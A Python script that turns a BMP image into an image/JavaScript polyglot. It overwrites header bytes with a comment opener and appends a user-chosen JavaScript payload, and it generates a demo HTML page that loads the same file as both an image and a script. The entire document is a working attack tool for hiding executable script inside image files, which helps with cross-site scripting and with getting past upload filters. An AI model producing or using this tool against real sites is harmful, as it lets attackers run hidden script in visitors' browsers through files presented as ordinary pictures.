#!/usr/bin/env python
#coding: utf-8

# Inject JS Codes In BMP Pictures
# This script is edited from the origin of following links.
# 
# Ref:
# http://marcoramilli.blogspot.com/2013/10/hacking-through-images.html
# http://danqingdani.blog.163.com/blog/static/186094195201392303213948

import os
import argparse

def injectFile(payload,fname):
	f = open(fname,"r+b")
	b = f.read()
	f.close()

	f = open(fname,"w+b")
	f.write(b)
	f.seek(2,0)
	f.write(b'\x2F\x2A') # 对应js中的注释符号/*
	f.close()

	f = open(fname,"a+b")
	f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
	f.write(payload)
	f.close()
	return True

def demo(fname):
	html="""
	<html>
	<head><title>BMP Image Js Injector</title></head>
	<body>
	<img src="#img#"\>
	<script src="#img#"></script>
	</body>
	</html>
	""".replace("#img#",fname)
	with open("demo.html","w") as f:
		f.write(html)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("filename",help="the bmp file name to infected")
	parser.add_argument("js_payload",help="the payload to be injected. For exampe: \"alert(1);\"")
	args = parser.parse_args()
	injectFile(args.js_payload,args.filename)
	demo(args.filename)